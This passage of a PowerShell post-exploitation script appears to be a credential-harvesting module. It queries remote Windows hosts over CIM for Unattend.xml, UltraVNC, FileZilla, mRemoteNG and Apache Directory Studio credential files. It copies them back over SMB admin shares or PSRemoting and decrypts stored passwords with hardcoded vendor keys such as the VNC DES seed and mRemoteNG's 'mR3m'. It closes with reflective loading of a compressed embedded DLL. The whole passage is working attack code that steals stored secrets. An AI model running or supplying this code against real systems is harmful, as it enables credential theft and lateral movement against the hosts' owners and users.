                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value "N/A"
                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
                        Write-Output $result
                    }
                }
            }
        }

        $ComputerName = $CimSession.ComputerName
    }

    Process {
        $commonFiles = @(
            "C:\Windows\Panther\Unattended.xml"
            "C:\Windows\Panther\Unattend.xml"
            "C:\Windows\Panther\Unattend\Unattended.xml"
            "C:\Windows\Panther\Unattend\Unattend.xml"
            "C:\Windows\System32\Sysprep\Unattend.xml"
            "C:\Windows\System32\Sysprep\Panther\Unattend.xml"
        )

        foreach ($commonFile in $commonFiles) {
            $filePath = $commonFile.Replace('\','\\')
            $filter  = "Name='$filePath'"
            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
            if ($file.Name) {
                $result = New-Object -TypeName PSObject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'Unattended'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

                if ($Download) {
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $file.Name -split '\\'
                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($PSSession) {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                    }
                    else {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                    }
                    # Extract credentials from file
                    if ($creds = Get-UnattendSensitiveData -Path $outputFile) {
                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                        Write-Output $result
                    }
                }
                else {
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value @()
                    Write-Output $result
                }
            }
        }
    }

    End {}
}

Function Local:Get-VncCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
            if ($EncryptedPassword.Length -lt 8) {
                return ""
            }
            [byte[]] $seed = (23, 82, 107, 6, 35, 78, 88, 7)
            $key = New-Object byte[] $seed.Length
            for ($i = 0; $i -lt 8; $i++) {
                $key[$i] = (
                    (($seed[$i] -band 0x01) -shl 7) -bor
                    (($seed[$i] -band 0x02) -shl 5) -bor
                    (($seed[$i] -band 0x04) -shl 3) -bor
                    (($seed[$i] -band 0x08) -shl 1) -bor
                    (($seed[$i] -band 0x10) -shr 1) -bor
                    (($seed[$i] -band 0x20) -shr 3) -bor
                    (($seed[$i] -band 0x40) -shr 5) -bor
                    (($seed[$i] -band 0x80) -shr 7)
                )
            }
            $des = New-Object Security.Cryptography.DESCryptoServiceProvider
            $des.Padding = [Security.Cryptography.PaddingMode]::Zeros
            $des.Mode = [Security.Cryptography.CipherMode]::ECB
            return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
        }

        Function Local:HexStringToByteArray ([string] $HexString) {    
            $byteArray = New-Object Byte[] ($HexString.Length/2);
            for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
            }
            return @( ,$byteArray)
        }

        $ComputerName = $CimSession.ComputerName
    }

    Process {
        $commonFiles = @(
            "C:\Program Files\UltraVNC\ultravnc.ini"
            "C:\Program Files (x86)\UltraVNC\ultravnc.ini"
            "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"
            "C:\Program Files (x86)\uvnc bvba\UltraVNC\ultravnc.ini"
        )

        foreach ($commonFile in $commonFiles) {
            $filePath = $commonFile.Replace('\','\\')
            $filter  = "Name='$filePath'"
            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
            if ($file.Name) {
                $result = New-Object -TypeName PSObject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

                if ($Download) {
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $file.Name -split '\\'
                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($PSSession) {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                    }
                    else {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                    }
                    # Extract credentials from file
                    $creds = New-Object -TypeName PSObject
                    $reader = New-Object IO.StreamReader($outputFile)
                    while (($line = $reader.ReadLine()) -ne $null) {
                        if ($line.Contains("passwd=")) {
                            $pass = ($line.Split('=')[1]).Substring(0, 16)
                            $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($pass)))
                        }
                        if ($line.Contains("passwd2=")) {
                            $pass = ($line.Split('=')[1]).Substring(0, 16)
                            $creds | Add-Member -MemberType NoteProperty -Name 'ViewOnly' -Value (Get-VncDecryptedPassword(HexStringToByteArray($pass)))
                        }
                        if ($line.Contains("PortNumber=") -and -not $line.Contains("HTTP") -and -not $line.Contains("=0")) {
                            $creds | Add-Member -MemberType NoteProperty -Name 'Port' -Value ($line.Split('=')[1])
                        }
                    }
                    $reader.Close()
                    if ($creds.Count -gt 0) {
                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                        Write-Output $result
                    }
                }
                else {
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value @()
                    Write-Output $result
                }
            }
        }
    }

    End {}
}

Function Local:Get-FilezillaCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [string]
        $ProfilePath,

        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        $ComputerName = $CimSession.ComputerName
    }

    Process {
        $userFiles = @(
            "\AppData\Roaming\FileZilla\sitemanager.xml"
            "\AppData\Roaming\FileZilla\recentservers.xml"
        )

        foreach ($userFile in $userFiles) {
            $filePath = ($ProfilePath + $userFile).Replace('\','\\')
            $filter  = "Name='$filePath'"
            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
            if ($file.Name) {
                $result = New-Object -TypeName PSObject
                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'FileZilla'
                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

                if ($Download) {
                    $outputDir = "$PWD\$ComputerName"
                    $temp = $ProfilePath -split "\\"
                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                    if ($PSSession) {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                    }
                    else {
                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                    }
                    # Extract credentials from file
                    $creds = New-Object Collections.ArrayList
                    $xml = [Xml] (Get-Content $outputFile)
                    if (-not ($sessions = $xml.SelectNodes('//FileZilla3/Servers/Server')).Count) {
                        $sessions = $xml.SelectNodes('//FileZilla3/RecentServers/Server')
                    }
                    foreach($session in $sessions) {
                        if ($session.Pass -and $session.Pass.Attributes["encoding"].Value -eq "base64") {
                            $password = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($session.Pass.InnerText))
                        }
                        elseif ($session.Pass) {
                            $password = $session.Pass.InnerText
                        }
                        if ($password -or ($keyFile = $session.KeyFile)) {
                            $cred = @{}
                            $cred["Username"] = $session.User
                            $cred["Password"] = $password
                            $cred["Hostname"] = $session.Host
                            $cred["Port"] = $session.Port
                            $cred["Protocol"] = $session.Protocol

                            if ($keyFile) {
                                # Download key file
                                $keyFilePath = $keyFile.Replace('\','\\')
                                $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$keyFilePath'" -CimSession $cimSession -Verbose:$false
                                if ($file.Name) {
                                    $cred["KeyFile"] = $keyFile
                                    $outputDir = "$PWD\$ComputerName"
                                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                                    if ($PSSession) {
                                        Get-RemoteFile -Path $keyFile -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                                    }
                                    else {
                                        Get-RemoteFile -Path $keyFile -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                                    }
                                }
                            }
                            $creds.Add((New-Object PSObject -Property $cred)) | Out-Null
                        }
                    }
                    if ($creds.Count -gt 0) {
                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                        Write-Output $result
                    }
                }
                else {
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value @()
                    Write-Output $result
                }
            }
        }
    }

    End {}
}

Function Local:Get-MRNGCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [string]
        $ProfilePath,

        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        Function Local:Get-MRNGCredential ([Xml.XmlElement] $Node) {
            $Node.ChildNodes | ForEach-Object {
                if ($_.Type -eq 'Connection' -and $_.Password) {
                    $password =  ConvertFrom-MRNGSecureString -EncryptedMessage $_.Password
                    $cred = @{}
                    $cred["Domain"] = $_.Domain
                    $cred["Username"] = $_.Username
                    $cred["Password"] = $password
                    $cred["Hostname"] = $_.Hostname
                    $cred["Port"] = $_.Port
                    $cred["Protocol"] = $_.Protocol
                    return (New-Object PSObject -Property $cred)
                }
                elseif ($_.Type -eq 'Container') {
                    Get-MRNGCredential $_
                }
            }
        }

        # Adapted from PSmRemoteNG powershell module by @realslacker
        Function Local:ConvertFrom-MRNGSecureString {
            [OutputType([string])]
            Param (
                [Parameter(Mandatory)]
                [ValidateNotNullOrEmpty()]
                [string]
                $EncryptedMessage,

                [ValidateNotNullOrEmpty()]
                [securestring]
                $EncryptionKey = (ConvertTo-SecureString -String 'mR3m' -AsPlainText -Force),

                [ValidateSet('AES', 'Serpent', 'Twofish')]
                [string]
                $EncryptionEngine = 'AES',

                [ValidateSet('GCM', 'CCM', 'EAX')]
                [string]
                $BlockCipherMode = 'GCM',

                [ValidateRange(1000, 50000)]
                [int]
                $KeyDerivationIterations = 1000
            )

            $EncryptionKeyBSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($EncryptionKey)
            $EncryptionKeyText = [Runtime.InteropServices.Marshal]::PtrToStringAuto($EncryptionKeyBSTR)
            $EncryptionKeyBytes = [Org.BouncyCastle.Crypto.PbeParametersGenerator]::Pkcs5PasswordToBytes([char[]]$EncryptionKeyText)
            $EncryptedMessageBytes = [convert]::FromBase64String($EncryptedMessage)
            $Engine = switch ($EncryptionEngine) {
                'AES'     { [Org.BouncyCastle.Crypto.Engines.AesEngine]::new() }
                'Serpent' { [Org.BouncyCastle.Crypto.Engines.SerpentEngine]::new() }
                'Twofish' { [Org.BouncyCastle.Crypto.Engines.TwofishEngine]::new() }
            }
            $Cipher = switch ($BlockCipherMode) {
                'GCM' { [Org.BouncyCastle.Crypto.Modes.GcmBlockCipher]::new($Engine) }
                'CCM' { [Org.BouncyCastle.Crypto.Modes.CcmBlockCipher]::new($Engine) }
                'EAX' { [Org.BouncyCastle.Crypto.Modes.EaxBlockCipher]::new($Engine) }
            }
            $SecureRandom = [Org.BouncyCastle.Security.SecureRandom]::new()
            $NonceBitSize = 128
            $MacBitSize   = 128
            $KeyBitSize   = 256
            $SaltBitSize  = 128
            $MinPasswordLength = 1
            $Salt = New-Object byte[] ($SaltBitSize/8)
            [array]::Copy($EncryptedMessageBytes, 0, $Salt,  0, $Salt.Length)
            $KeyGenerator = [Org.BouncyCastle.Crypto.Generators.Pkcs5S2ParametersGenerator]::new()
            $KeyGenerator.Init($EncryptionKeyBytes, $Salt, $KeyDerivationIterations)
            $KeyParameter = $KeyGenerator.GenerateDerivedMacParameters($KeyBitSize)
            $KeyBytes = $KeyParameter.GetKey()
            $CipherStream = New-Object System.IO.MemoryStream (, $EncryptedMessageBytes)
            $CipherReader = New-Object System.IO.BinaryReader ($CipherStream)
            $Payload = $CipherReader.ReadBytes($Salt.Length)
            $Nonce = $CipherReader.ReadBytes($NonceBitSize / 8)
            $Parameters = [Org.BouncyCastle.Crypto.Parameters.AeadParameters]::new($KeyParameter, $MacBitSize, $Nonce, $Payload)
            $Cipher.Init($false, $Parameters)
            $CipherTextBytes = $CipherReader.ReadBytes($EncryptedMessageBytes.Length - $Nonce.Length)
            $PlainTextByteArray = New-Object byte[] ($Cipher.GetOutputSize($CipherTextBytes.Length))
            $Len = $Cipher.ProcessBytes($CipherTextBytes, 0, $CipherTextBytes.Length, $PlainTextByteArray, 0)
            $Cipher.DoFinal($PlainTextByteArray, $Len) > $null
            return [Text.Encoding]::UTF8.GetString($PlainTextByteArray)
        }

        $ComputerName = $CimSession.ComputerName
    }

    Process {
        $userFile = "\AppData\Roaming\mRemoteNG\confCons.xml"
        $filePath = ($ProfilePath + $userFile).Replace('\','\\')
        $filter  = "Name='$filePath'"
        $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
        if ($file.Name) {
            $result = New-Object -TypeName PSObject
            $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
            $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'mRemoteNG'
            $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
            $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
            $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

            if ($Download) {
                $outputDir = "$PWD\$ComputerName"
                $temp = $ProfilePath -split "\\"
                $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                if ($PSSession) {
                    Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                }
                else {
                    Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                }
                # Extract credentials from file
                $xml = [Xml] (Get-Content $outputFile)
                $nsm = New-Object Xml.XmlNamespaceManager($xml.NameTable)
                $nsm.AddNamespace('mrng', 'http://mremoteng.org')
                $nodes = $xml.SelectNodes('//mrng:Connections', $nsm)
                $creds = New-Object Collections.ArrayList
                foreach($node in $nodes) {
                    $cred = Get-MRNGCredential $node
                    foreach ($c in $cred) {
                        $creds.Add(($c)) | Out-Null
                    }
                }
                if ($creds.Count -gt 0) {
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                    Write-Output $result
                }
            }
            else {
                $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value @()
                Write-Output $result
            }
        }
    }

    End {}
}

Function Local:Get-ApacheDirectoryStudioCredentialFile {
    Param (
        [Parameter(Mandatory = $True)]
        [string]
        $ProfilePath,

        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Switch]
        $Download,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        $ComputerName = $CimSession.ComputerName
    }

    Process {
        $userFile = "\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml"
        $filePath = ($ProfilePath + $userFile).Replace('\','\\')
        $file = Get-CimInstance -Class CIM_LogicalFile -Filter "Name='$filePath'" -CimSession $CimSession -Verbose:$false
        if ($file.Name) {
            $result = New-Object -TypeName PSObject
            $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
            $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'ApacheDirectoryStudio'
            $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
            $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
            $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified

            if ($Download) {
                $outputDir = "$PWD\$ComputerName"
                $temp = $ProfilePath -split "\\"
                $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
                if ($PSSession) {
                    Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                }
                else {
                    Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                }
                # Extract credentials from file
                $xml = [Xml] (Get-Content $outputFile)
                $nodes = $xml.SelectNodes('//connections')
                $creds = New-Object Collections.ArrayList
                foreach($node in $nodes) {
                    $node.ChildNodes | ForEach-Object {
                        if ($_.bindPassword) {
                            $cred = @{}
                            $cred["Username"] = $_.bindPrincipal
                            $cred["Password"] = $_.bindPassword
                            $cred["Hostname"] = $_.host
                            $cred["Port"] = $_.port
                            $cred["Protocol"] = 'LDAP'
                            $creds.Add((New-Object PSObject -Property $cred)) | Out-Null
                        }
                    }
                }
                if ($creds.Count -gt 0) {
                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                    Write-Output $result
                }
            }
            else {
                $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value @()
                Write-Output $result
            }
        }
    }

    End {}
}

Function Local:Get-RemoteFile {
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        $Path,

        [Parameter(Mandatory = $True)]
        [String]
        $Destination,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.Automation.Runspaces.PSSession]
        $PSSession
    )

    Begin {
        Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
            $stringBuilder = New-Object System.Text.StringBuilder 
            [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
                [Void]$stringBuilder.Append($_.ToString("x2")) 
            } 
            return $stringBuilder.ToString() 
        }
    }

    Process {
        if ($PSSession) {
            # Download file via PSRemoting
            Copy-Item -Path $Path -Destination $Destination -FromSession $PSSession -Recurse
        }
        else {
            # Download file via SMB
            $fileDrive = ($Path -split ':').Get(0)
            $filePath = ($Path -split ':').Get(1)
            if ($Credential.Username) {
                $drive = Get-StringHash $ComputerName
                New-PSDrive -Name $drive -Root "\\$ComputerName\$fileDrive`$" -PSProvider "FileSystem" -Credential $Credential | Out-Null
                Copy-Item -Path "${drive}:$filePath" -Destination $Destination -Recurse
                Remove-PSDrive $drive
            }
            else {
                Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
            }
        }
    }

    End {}
}

# Bouncy Castle library adapted from https://github.com/mRemoteNG/mRemoteNG
$encodedCompressedDll = @'
'@
$deflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encodedCompressedDll),[IO.Compression.CompressionMode]::Decompress)
$uncompressedBytes = New-Object Byte[](2243440)
$deflatedStream.Read($uncompressedBytes, 0, 2243440) | Out-Null
$null = [Reflection.Assembly]::Load($uncompressedBytes)